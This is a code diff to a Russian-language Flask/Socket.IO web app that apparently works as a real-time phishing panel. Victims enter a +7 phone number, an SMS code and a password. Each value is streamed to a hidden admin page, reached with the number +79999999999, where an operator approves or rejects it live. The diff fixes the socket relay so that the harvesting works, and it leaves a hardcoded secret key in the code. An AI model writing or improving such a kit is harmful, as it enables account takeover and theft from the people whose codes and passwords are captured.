@@ -2,10 +2,11 @@ import eventlet
 eventlet.monkey_patch()
 
 from flask import Flask, render_template_string, request, redirect, url_for
-from flask_socketio import SocketIO, emit
+from flask_socketio import SocketIO, emit, join_room, leave_room
 
 app = Flask(__name__)
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
+app.config['SECRET_KEY'] = 'your-secret-key-here'
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', logger=True, engineio_logger=True)
 
 # Хранение состояний пользователей
 users = {}  # phone: {'entered_code': str, 'confirmed_code': bool, 'entered_password': str, 'confirmed_password': bool}
@@ -13,7 +14,7 @@ logs = []  # Список логов для админа
 
 def log_action(message):
     logs.append(message)
-    socketio.emit('new_log', message, broadcast=True)  # Исправлено: используем socketio.emit вместо emit
+    socketio.emit('new_log', message, namespace='/')
 
 @app.route('/')
 def index():
@@ -34,10 +35,6 @@ def index():
             button:active { transform: scale(0.95); }
             @media (max-width: 600px) { .container { padding: 10px; } }
         </style>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
-        <script>
-            var socket = io();
-        </script>
     </head>
     <body>
         <div class="container">
@@ -71,10 +68,18 @@ def phone():
         </style>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
         <script>
-            var socket = io();
+            var socket = io({
+                transports: ['websocket', 'polling']
+            });
+            
+            socket.on('connect', function() {
+                console.log('Socket connected');
+            });
+            
             socket.on('redirect_to_admin', function(data) {
                 window.location.href = data.url;
             });
+            
             function submitPhone() {
                 var phone = document.getElementById('phone').value;
                 if (!phone.startsWith('+7') || phone.length < 12) {
@@ -82,10 +87,9 @@ def phone():
                     return;
                 }
                 socket.emit('submit_phone', phone);
-                // Для обычных пользователей перейти к вводу кода; для админа - редирект через emit
                 setTimeout(function() {
                     window.location.href = '/code?phone=' + encodeURIComponent(phone);
-                }, 500);  // Небольшая задержка для обработки редиректа админа
+                }, 500);
             }
         </script>
     </head>
@@ -100,15 +104,14 @@ def phone():
     </html>
     ''')
 
-@socketio.on('submit_phone')
+@socketio.on('submit_phone', namespace='/')
 def handle_phone(phone):
     if not phone.startswith('+7'):
         return
-    # Проверка на админский номер: все цифры после +7 - 9
-    digits = phone[2:]  # Убираем +7
+    digits = phone[2:]
     if len(digits) == 10 and all(d == '9' for d in digits):
         log_action(f'Админ вошел с номером: {phone}')
-        emit('redirect_to_admin', {'url': '/admin'})  # Эмит к конкретному клиенту (по умолчанию)
+        emit('redirect_to_admin', {'url': '/admin'})
         return
     users[phone] = {'entered_code': None, 'confirmed_code': False, 'entered_password': None, 'confirmed_password': False}
     log_action(f'Пользователь подал номер: {phone}')
@@ -139,12 +142,16 @@ def code():
         </style>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
         <script>
-            var socket = io();
+            var socket = io({
+                transports: ['websocket', 'polling']
+            });
             var phone = '{{ phone }}';
+            
             function submitCode() {
                 var code = document.getElementById('code').value;
                 socket.emit('submit_code', {phone: phone, code: code});
             }
+            
             socket.on('code_confirmed', function(data) {
                 if (data.phone === phone && data.confirmed) {
                     window.location.href = '/password?phone=' + encodeURIComponent(phone);
@@ -191,12 +198,16 @@ def password():
         </style>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
         <script>
-            var socket = io();
+            var socket = io({
+                transports: ['websocket', 'polling']
+            });
             var phone = '{{ phone }}';
+            
             function submitPassword() {
                 var password = document.getElementById('password').value;
                 socket.emit('submit_password', {phone: phone, password: password});
             }
+            
             socket.on('password_confirmed', function(data) {
                 if (data.phone === phone && data.confirmed) {
                     document.getElementById('status').innerText = 'Авторизация успешна!';
@@ -239,19 +250,24 @@ def admin():
         </style>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
         <script>
-            var socket = io();
+            var socket = io({
+                transports: ['websocket', 'polling']
+            });
+            
             socket.on('new_log', function(msg){
                 var div = document.getElementById('logs');
                 div.innerHTML += msg + '<br>';
                 div.scrollTop = div.scrollHeight;
             });
+            
             socket.on('new_code', function(data){
                 var pending = document.getElementById('pending');
                 var entry = document.createElement('div');
-                entry.id = 'code-' + data.phone.replace(/[^a-zA-Z0-9]/g, '');  // Безопасный ID
+                entry.id = 'code-' + data.phone.replace(/[^a-zA-Z0-9]/g, '');
                 entry.innerHTML = `Номер: ${data.phone}, Введенный код: ${data.code} <button onclick="confirmCode('${data.phone}')">Код верный</button><button class="reject" onclick="confirmCode('${data.phone}', false)">Код неверный</button>`;
                 pending.appendChild(entry);
             });
+            
             socket.on('new_password', function(data){
                 var pending = document.getElementById('pending');
                 var entry = document.createElement('div');
@@ -259,11 +275,13 @@ def admin():
                 entry.innerHTML = `Номер: ${data.phone}, Введенный пароль: ${data.password} <button onclick="confirmPassword('${data.phone}')">Пароль верный</button><button class="reject" onclick="confirmPassword('${data.phone}', false)">Пароль неверный</button>`;
                 pending.appendChild(entry);
             });
+            
             function confirmCode(phone, confirmed = true) {
                 socket.emit('confirm_code', {phone: phone, confirmed: confirmed});
                 var entry = document.getElementById('code-' + phone.replace(/[^a-zA-Z0-9]/g, ''));
                 if (entry) entry.remove();
             }
+            
             function confirmPassword(phone, confirmed = true) {
                 socket.emit('confirm_password', {phone: phone, confirmed: confirmed});
                 var entry = document.getElementById('password-' + phone.replace(/[^a-zA-Z0-9]/g, ''));
@@ -274,7 +292,7 @@ def admin():
     <body>
         <div class="container">
             <h2>Админ-панель</h2>
-            <div id="logs" style="height:300px;overflow-y:scroll;border:1px solid #ccc"></div>
+            <div id="logs"></div>
             <h3>Ожидающие подтверждения</h3>
             <div id="pending"></div>
         </div>
@@ -282,43 +300,51 @@ def admin():
     </html>
     ''')
 
-@socketio.on('submit_code')
+@socketio.on('submit_code', namespace='/')
 def handle_code(data):
     phone = data['phone']
     code = data['code']
     if phone in users:
         users[phone]['entered_code'] = code
         log_action(f'Пользователь {phone} ввел код: {code}')
-        socketio.emit('new_code', {'phone': phone, 'code': code}, broadcast=True)  # Для админа
+        socketio.emit('new_code', {'phone': phone, 'code': code}, namespace='/')
 
-@socketio.on('confirm_code')
+@socketio.on('confirm_code', namespace='/')
 def confirm_code(data):
     phone = data['phone']
     confirmed = data['confirmed']
     if phone in users:
         users[phone]['confirmed_code'] = confirmed
-        emit('code_confirmed', {'phone': phone, 'confirmed': confirmed})
+        socketio.emit('code_confirmed', {'phone': phone, 'confirmed': confirmed}, namespace='/')
         log_action(f'Админ {"подтвердил" if confirmed else "отклонил"} код для {phone}')
 
-@socketio.on('submit_password')
+@socketio.on('submit_password', namespace='/')
 def handle_password(data):
     phone = data['phone']
     password = data['password']
     if phone in users:
         users[phone]['entered_password'] = password
         log_action(f'Пользователь {phone} ввел пароль: {password}')
-        socketio.emit('new_password', {'phone': phone, 'password': password}, broadcast=True)  # Для админа
+        socketio.emit('new_password', {'phone': phone, 'password': password}, namespace='/')
 
-@socketio.on('confirm_password')
+@socketio.on('confirm_password', namespace='/')
 def confirm_password(data):
     phone = data['phone']
     confirmed = data['confirmed']
     if phone in users:
         users[phone]['confirmed_password'] = confirmed
-        emit('password_confirmed', {'phone': phone, 'confirmed': confirmed})
+        socketio.emit('password_confirmed', {'phone': phone, 'confirmed': confirmed}, namespace='/')
         log_action(f'Админ {"подтвердил" if confirmed else "отклонил"} пароль для {phone}')
+
+@socketio.on('connect', namespace='/')
+def handle_connect():
+    print('Client connected')
+
+@socketio.on('disconnect', namespace='/')
+def handle_disconnect():
+    print('Client disconnected')
 
 if __name__ == '__main__':
     import os
     port = int(os.environ.get("PORT", 5000))
-    socketio.run(app, host="0.0.0.0", port=port)
+    socketio.run(app, host="0.0.0.0", port=port, debug=False)
